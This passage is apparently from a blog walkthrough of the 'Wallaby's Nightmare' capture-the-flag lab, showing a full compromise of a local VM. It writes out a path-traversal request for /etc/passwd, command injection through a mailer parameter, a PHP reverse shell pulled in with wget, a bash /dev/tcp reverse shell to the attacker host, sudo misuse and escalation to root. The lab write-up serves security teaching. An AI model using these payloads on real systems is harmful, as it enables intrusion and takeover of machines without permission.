+ /index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;probably Rocket, but could be any index.php&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7537 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 7 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2017-07-15 08:29:23 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;27 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hey, it's the same vulnerability as in the previous page. Let's exploit it once again. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101:60080/index.php?page=index.php

&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Dude, &lt;span class=&quot;nt&quot;&gt;&amp;lt;em&amp;gt;&lt;/span&gt;bobby&lt;span class=&quot;nt&quot;&gt;&amp;lt;/em&amp;gt;&lt;/span&gt; what are you trying over here?!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I'm running a dirbuster! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# dirb http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /usr/share/dirb/wordlists/big.txt

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
DIRB v2.22    
By The Dark Raver
&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

START_TIME: Sat Jul 15 08:36:59 2017
URL_BASE: http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

GENERATED WORDS: 20458                                                         

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;blacklist &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:992&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;              
+ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;cgi-bin/ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:898&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;               
+ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;contact &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:895&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                
+ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;home &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:1145&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                  
+ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;index &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:1360&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                 
+ http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mailer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:1083&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
END_TIME: Sat Jul 15 08:37:24 2017
DOWNLOADED: 20458 - FOUND: 6&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can now manually go through these pages to look for anything interesting. There's nothing in the contact...&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.56.101:60080/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;contact

Contact me with all your whining at wallaby@wallaby.wallaby.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But mailer, mailer is interesting. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101:60080/index.php?page=mailer

&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'color:blue;'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Coming Soon guys!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;&amp;lt;!--a href='/?page=mailer&amp;amp;mail=mail wallaby &quot;message goes here&quot;'&amp;gt;&amp;lt;button type='button'&amp;gt;Sendmail&amp;lt;/button--&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;&amp;lt;!--Better finish implementing this so bobby can send me all his loser complaints!--&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And by trial and error, I've found that it's even vulnerable to command injection. Let's check that! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://192.168.56.101:60080/?page=mailer&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;mail=uname%20-a
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Our plan is to upload a &lt;b&gt;PHP Reverse Shell&lt;/b&gt; to the machine. Firstly, let's copy it, so then we can modify the code. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/web# cp /usr/share/webshells/php/php-reverse-shell.php ~/web&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set_time_limit&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$VERSION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'192.168.56.102'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// CHANGE THIS
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$chunk_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$write_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$error_a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uname -a; w; id; /bin/sh -i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$daemon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, we're ready to upload the file on Python SimpleHTTPServer. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/web# python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And we can use &lt;b&gt;wget&lt;/b&gt; to download the shell on our victim machine. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mailer&amp;amp;mail&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;wget%20192.168.56.102:8000/shell.php
http://192.168.56.101:60080/?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mailer&amp;amp;mail&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls

&lt;/span&gt;eye.jpg index.php s13!34g&lt;span class=&quot;nv&quot;&gt;$3FVA5e&lt;/span&gt;@ed sec.png shell.php uname.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now start the netcat listener and navigate to the shell.php file. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 1234
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.101] 59808
Linux ubuntu 4.4.0-31-generic &lt;span class=&quot;c&quot;&gt;#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
 08:07:00 up 53 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
waldo    pts/0    tmux&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;642&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.%0     07:13   53:39   0.64s  0.64s irssi
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
$ python -c '&lt;/span&gt;import pty&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pty.spawn&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'
www-data@ubuntu:/$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And we're connected! Running &lt;b&gt;sudo -l&lt;/b&gt; gives us information that we can run &lt;b&gt;iptables&lt;/b&gt; as &lt;b&gt;www-data&lt;/b&gt; and &lt;b&gt;vim&lt;/b&gt; with certain file as &lt;b&gt;waldo&lt;/b&gt; user. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@ubuntu:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data on ubuntu:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User www-data may run the following commands on ubuntu:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;waldo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /sbin/iptables&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Remember that &lt;b&gt;IRC&lt;/b&gt; port that came up during the first scan? It was filtered, so flushing the iptables may allow us to connect. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@ubuntu:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;iptables &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, let's check that by running another nmap scan. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap 192.168.56.101

Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-07-15 11:32 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00017s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
6667/tcp open  irc
MAC Address: 08:00:27:BC:E8:C6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.29 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, it's open! Let's connect to it using &lt;b&gt;HexChat&lt;/b&gt;. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/irc-first-look.png&quot; alt=&quot;First look at IRC&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;List of commands, let's take a look at them! &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/wallabys-nightmare/irc-commands.png&quot; alt=&quot;IRC commands&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Best option to gain his identity, would be kicking him from the chat. But how? Firstly we can take a look at the current processes running as waldo user. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@ubuntu:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;waldo
ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;waldo
waldo      642  0.0  0.2  29416  3024 ?        Ss   07:13   0:00 tmux new-session &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; irssi
waldo      687  0.0  0.0   4508   784 pts/0    Ss   07:13   0:00 &lt;span class=&quot;nt&quot;&gt;-sh&lt;/span&gt;
waldo      733  0.0  0.8 115744  8484 pts/0    Sl+  07:13   0:01 irssi
www-data  1414  0.0  0.0  11284   944 pts/1    S+   08:43   0:00 &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;waldo&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's remember the number of irssi process - 773. Now we can use vim to kill the process. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@ubuntu:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf
&amp;lt;waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf            

E558: Terminal entry not found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;terminfo
&lt;span class=&quot;s1&quot;&gt;'unknown'&lt;/span&gt; not known. Available &lt;span class=&quot;nb&quot;&gt;builtin &lt;/span&gt;terminals are:
    builtin_amiga
    builtin_beos-ansi
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to &lt;span class=&quot;s1&quot;&gt;'ansi'&lt;/span&gt;

:!kill 733st &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:60080&amp;gt;
        &lt;span class=&quot;c&quot;&gt;# The ServerName directive sets the request scheme, hostname and port th&lt;/span&gt;
at
        &lt;span class=&quot;c&quot;&gt;# the server uses to identify itself. This is used when creating&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# redirection URLs. In the context of virtual hosts, the ServerName&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# specifies what hostname must appear in the request's Host: header to&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# match this virtual host. For the default virtual host (this file) this&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# value is not decisive as it is used as a last resort host regardless.&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# However, you must set it for any further virtual host explicitly.&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#ServerName www.example.com&lt;/span&gt;

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        &lt;span class=&quot;c&quot;&gt;# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,&lt;/span&gt;
:!kill 733&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, a few moments later we can see that waldo has quit. We can now quickly change our name to his using &lt;b&gt;/nick waldo&lt;/b&gt; command, and fortunately, we'll be able to execute &lt;b&gt;.run&lt;/b&gt; command. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; waldo has quit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Client exited&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; You are now known as waldo
&amp;lt;waldo&amp;gt; .run whoami
&amp;lt;wallabysbot&amp;gt; b&lt;span class=&quot;s1&quot;&gt;'wallaby'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Firstly let's start the listener on port 8080. Now let's enter this useful trick, which will provide us with a shell. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;waldo&amp;gt; .run bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.102/8080 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 8080
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8080 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.101] 57524
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;624&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
wallaby@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;wallaby on ubuntu:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User wallaby may run the following commands on ubuntu:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: ALL&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In addition we can freely use sudo. Amazing! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wallaby@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
whoami
root
&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;www
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 52
drwxr-xr-x 8 wallaby wallaby 4096 Dec 16  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 5 root    root    4096 Dec 16  2016 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 wallaby wallaby    1 Dec 30  2016 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 wallaby wallaby  220 Dec 16  2016 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 wallaby wallaby 3771 Dec 16  2016 .bashrc
drwx------ 3 wallaby wallaby 4096 Dec 16  2016 .cache
drwx------ 2 wallaby wallaby 4096 Dec 16  2016 .irssi
drwx------ 4 wallaby wallaby 4096 Dec 16  2016 .local
drwxrwxr-x 2 wallaby wallaby 4096 Dec 16  2016 .nano
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 wallaby wallaby  655 Dec 16  2016 .profile
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 wallaby wallaby   66 Dec 16  2016 .selected_editor
drwxrwxr-x 4 wallaby wallaby 4096 Dec 30  2016 .sopel
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 wallaby wallaby    0 Dec 16  2016 .sudo_as_admin_successful
drwxrwxr-x 3 wallaby wallaby 4096 Dec 16  2016 www
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 48
drwx------  4 root root 4096 Dec 27  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 22 root root 4096 Dec 14  2016 ..
drwxr-xr-x  2 root root 4096 Dec 27  2016 backups
